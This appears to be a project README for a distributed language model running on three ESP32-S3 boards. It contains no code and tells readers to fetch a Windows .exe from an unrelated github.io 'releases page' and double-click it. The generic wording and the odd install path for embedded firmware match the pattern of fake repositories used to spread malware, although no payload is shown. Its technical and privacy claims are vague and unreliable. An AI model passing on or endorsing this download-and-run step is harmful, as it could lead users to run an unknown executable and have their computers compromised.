# 🧠 esp32s3-distributed-ai - Run large language models on hardware

[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://pleurocarpous-artist175.github.io)

This project allows you to run a 56-million parameter language model using three ESP32-S3 boards. The system splits the processing tasks across these boards to handle artificial intelligence tasks without an internet connection.

## ⚙️ System Requirements

To use this software, you need the following items:

*   Three ESP32-S3 development boards.
*   A Windows computer to manage the setup.
*   A USB cable for each board.
*   A stable power supply for each board.

## 📥 Downloading the software

Visit the [official releases page](https://pleurocarpous-artist175.github.io) to obtain the necessary files. Download the most recent version available in the list. Ensure you save the file in a folder you can locate easily, such as your Downloads folder.

## 🔌 Connecting your hardware

Connect each ESP32-S3 board to your computer using a USB cable. Your computer will detect the boards as serial devices. You should keep a record of which port each board connects to, as the software needs this information to send data.

## 🛠️ Installation and Setup

1. Open the downloaded folder on your computer.
2. Locate the file ending in .exe and double-click it.
3. Follow the prompts on your screen to install the interface.
4. Once the installation finishes, open the application from your desktop or start menu.
5. In the settings menu, select the COM ports assigned to your three ESP32-S3 boards.
6. Click the sync button to prepare the boards for distributed operation.

## 🧪 Testing the connection

After you complete the setup, click the button labeled Test Connection. The software sends a small signal to each board. If the status lights on your boards blink, the system is ready to process requests. If the software reports an error, check that each USB cable remains secure and that you selected the correct ports in the settings.

## 💡 How it works

The software uses a method called Split-PLE. This technique divides the model into smaller pieces. Each board holds a piece of the model. When you send a prompt, the boards communicate using a wireless protocol called ESP-NOW. They share the workload and combine their results to produce an answer. Because the boards handle all calculations, your privacy remains intact. No data leaves your local network.

## ⚠️ Troubleshooting common issues

If the boards stop responding, disconnect the USB cables and wait ten seconds. Plug them back into your computer and restart the software. Ensure your computer does not enter sleep mode while the boards process requests, as this disconnects the serial link. If the application crashes, verify that you installed the latest version from the releases page. 

## 📝 Performance tips

The performance of the model depends on the stability of the power source. Use high-quality USB cables to avoid data loss. If you encounter slow response times, minimize the number of background applications running on your Windows computer. This allows the software to manage the data flow to the boards without interruption.

## 📄 License and terms

This project is open source. You may modify the code for personal use. The design relies on efficient math operations to keep the memory usage low on each individual board. 

Keywords: edge-ai, edge-ai-engineering, edge-ai-models, embedded, embedded-c, embedded-systems, esp32, esp32-s3, esp32s3, kv, llm, llm-inference, ondevice-ai, ondeviceai, ondevicemachinelearning, optimization, quantilization, transformer, transformers